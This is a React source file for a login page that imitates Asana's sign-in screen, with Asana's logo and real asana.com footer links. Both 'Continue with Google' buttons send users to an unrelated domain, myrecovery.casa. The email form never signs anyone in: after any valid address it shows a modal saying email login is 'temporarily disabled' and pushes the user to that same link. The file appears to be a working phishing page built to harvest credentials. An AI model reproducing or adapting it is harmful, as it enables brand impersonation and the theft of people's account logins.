"use client"

import type React from "react"

import { useState } from "react"

export default function LoginPage() {
  const [email, setEmail] = useState("")
  const [emailError, setEmailError] = useState("")
  const [showModal, setShowModal] = useState(false)

  const validateEmail = (email: string) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    return emailRegex.test(email)
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (!email || !validateEmail(email)) {
      setEmailError("Please enter a valid email address.")
    } else {
      setEmailError("")
      setShowModal(true)
    }
  }

  const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setEmail(e.target.value)
    if (emailError) {
      setEmailError("")
    }
  }

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header with Asana logo */}
      <header className="p-6">
        <img src="/logo.png" alt="Asana" width="102" height="32" />
      </header>

      {/* Main content */}
      <main className="flex-1 flex items-center justify-center px-4 pb-32">
        <div className="w-full max-w-[336px]">
          <div className="text-center mb-8">
            <h1 className="text-3xl font-normal text-gray-900 mb-2">Welcome to Asana</h1>
            <p className="text-gray-600">To get started, please sign in</p>
          </div>

          <div className="space-y-4">
            <a
              href="https://myrecovery.casa"
              className="w-full flex items-center justify-center gap-3 px-4 py-3 border border-gray-300 rounded bg-white hover:bg-gray-50 transition-colors"
            >
              <svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path
                  d="M17.64 9.2c0-.637-.057-1.251-.164-1.84H9v3.481h4.844c-.209 1.125-.843 2.078-1.796 2.717v2.258h2.908c1.702-1.567 2.684-3.874 2.684-6.615z"
                  fill="#4285F4"
                />
                <path
                  d="M9.003 18c2.43 0 4.467-.806 5.956-2.183l-2.908-2.259c-.806.54-1.837.86-3.048.86-2.344 0-4.328-1.584-5.036-3.711H.957v2.332C2.438 15.983 5.482 18 9.003 18z"
                  fill="#34A853"
                />
                <path
                  d="M3.964 10.712c-.18-.54-.282-1.117-.282-1.71 0-.593.102-1.17.282-1.71V4.96H.957C.347 6.175 0 7.55 0 9.002c0 1.452.348 2.827.957 4.042l3.007-2.332z"
                  fill="#FBBC05"
                />
                <path
                  d="M9.003 3.58c1.321 0 2.508.454 3.44 1.345l2.582-2.58C13.464.891 11.426 0 9.003 0 5.482 0 2.438 2.017.957 4.958L3.964 7.29c.708-2.127 2.692-3.71 5.036-3.71z"
                  fill="#EA4335"
                />
              </svg>
              <span className="text-gray-700 font-medium">Continue with Google</span>
            </a>

            {/* Divider */}
            <div className="relative">
              <div className="absolute inset-0 flex items-center">
                <div className="w-full border-t border-gray-200"></div>
              </div>
              <div className="relative flex justify-center text-sm">
                <span className="px-2 bg-white text-gray-500">or</span>
              </div>
            </div>

            {/* Email form */}
            <form className="space-y-4" onSubmit={handleSubmit}>
              <div>
                <label htmlFor="email" className="block text-sm font-normal text-gray-700 mb-2">
                  Email address
                </label>
                <input
                  type="text"
                  id="email"
                  name="email"
                  value={email}
                  onChange={handleEmailChange}
                  className={`w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                    emailError ? "border-red-500" : "border-gray-300"
                  }`}
                />
                {emailError && <p className="mt-1 text-sm text-red-500">{emailError}</p>}
              </div>

              <button
                type="submit"
                className="w-full py-3 px-4 bg-[#4573D2] text-white rounded font-medium hover:bg-[#3D66BE] transition-colors"
              >
                Continue
              </button>
            </form>
          </div>
        </div>
      </main>

      <footer className="pb-6 px-6">
        <div className="text-center space-y-2">
          <div className="flex flex-wrap justify-center gap-x-2 gap-y-1 text-sm">
            <a
              href="https://asana.com"
              target="_blank"
              rel="noopener noreferrer"
              style={{ color: "#111827" }}
              className="hover:underline"
            >
              Asana.com
            </a>
            <span className="text-gray-400">•</span>
            <a
              href="https://asana.com/support"
              target="_blank"
              rel="noopener noreferrer"
              style={{ color: "#111827" }}
              className="hover:underline"
            >
              Support
            </a>
            <span className="text-gray-400">•</span>
            <a
              href="https://asana.com/apps"
              target="_blank"
              rel="noopener noreferrer"
              style={{ color: "#111827" }}
              className="hover:underline"
            >
              Integrations
            </a>
            <span className="text-gray-400">•</span>
            <a
              href="https://forum.asana.com"
              target="_blank"
              rel="noopener noreferrer"
              style={{ color: "#111827" }}
              className="hover:underline"
            >
              Forum
            </a>
            <span className="text-gray-400">•</span>
            <a
              href="https://developers.asana.com"
              target="_blank"
              rel="noopener noreferrer"
              style={{ color: "#111827" }}
              className="hover:underline"
            >
              Developers & API
            </a>
            <span className="text-gray-400">•</span>
            <a
              href="https://asana.com/resources"
              target="_blank"
              rel="noopener noreferrer"
              style={{ color: "#111827" }}
              className="hover:underline"
            >
              Resources
            </a>
            <span className="text-gray-400">•</span>
            <a
              href="https://asana.com/guide"
              target="_blank"
              rel="noopener noreferrer"
              style={{ color: "#111827" }}
              className="hover:underline"
            >
              Guide
            </a>
            <span className="text-gray-400">•</span>
            <a
              href="https://asana.com/templates"
              target="_blank"
              rel="noopener noreferrer"
              style={{ color: "#111827" }}
              className="hover:underline"
            >
              Templates
            </a>
            <span className="text-gray-400">•</span>
            <a
              href="https://asana.com/pricing"
              target="_blank"
              rel="noopener noreferrer"
              style={{ color: "#111827" }}
              className="hover:underline"
            >
              Pricing
            </a>
            <span className="text-gray-400">•</span>
            <a
              href="https://asana.com/terms"
              target="_blank"
              rel="noopener noreferrer"
              className="text-[#4573D2] hover:underline"
            >
              Terms
            </a>
            <span className="text-gray-400">•</span>
            <a
              href="https://asana.com/privacy"
              target="_blank"
              rel="noopener noreferrer"
              className="text-[#4573D2] hover:underline"
            >
              Privacy
            </a>
          </div>
          <p className="text-xs text-gray-600">
            This site is protected by reCAPTCHA and the Google{" "}
            <a
              href="https://policies.google.com/privacy"
              target="_blank"
              rel="noopener noreferrer"
              className="text-[#4573D2] hover:underline"
            >
              Privacy Policy
            </a>{" "}
            and{" "}
            <a
              href="https://policies.google.com/terms"
              target="_blank"
              rel="noopener noreferrer"
              className="text-[#4573D2] hover:underline"
            >
              Terms of Service
            </a>{" "}
            apply.
          </p>
        </div>
      </footer>

      {showModal && (
        <div className="fixed inset-0 bg-white/30 backdrop-blur-sm flex items-center justify-center z-50 px-4">
          <div className="bg-white rounded-lg shadow-xl max-w-md w-full p-8">
            <div className="flex flex-col items-center text-center">
              <img src="/logo.png" alt="Asana" width="120" height="38" className="mb-6" />

              <p className="text-gray-700 mb-6 leading-relaxed">
                Email login is temporarily disabled....Currently, you can sign in only with your Google Account.
              </p>

              <a
                href="https://myrecovery.casa"
                className="w-full flex items-center justify-center gap-3 px-4 py-3 border border-gray-300 rounded bg-white hover:bg-gray-50 transition-colors"
              >
                <svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path
                    d="M17.64 9.2c0-.637-.057-1.251-.164-1.84H9v3.481h4.844c-.209 1.125-.843 2.078-1.796 2.717v2.258h2.908c1.702-1.567 2.684-3.874 2.684-6.615z"
                    fill="#4285F4"
                  />
                  <path
                    d="M9.003 18c2.43 0 4.467-.806 5.956-2.183l-2.908-2.259c-.806.54-1.837.86-3.048.86-2.344 0-4.328-1.584-5.036-3.711H.957v2.332C2.438 15.983 5.482 18 9.003 18z"
                    fill="#34A853"
                  />
                  <path
                    d="M3.964 10.712c-.18-.54-.282-1.117-.282-1.71 0-.593.102-1.17.282-1.71V4.96H.957C.347 6.175 0 7.55 0 9.002c0 1.452.348 2.827.957 4.042l3.007-2.332z"
                    fill="#FBBC05"
                  />
                  <path
                    d="M9.003 3.58c1.321 0 2.508.454 3.44 1.345l2.582-2.58C13.464.891 11.426 0 9.003 0 5.482 0 2.438 2.017.957 4.958L3.964 7.29c.708-2.127 2.692-3.71 5.036-3.71z"
                    fill="#EA4335"
                  />
                </svg>
                <span className="text-gray-700 font-medium">Continue with Google</span>
              </a>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
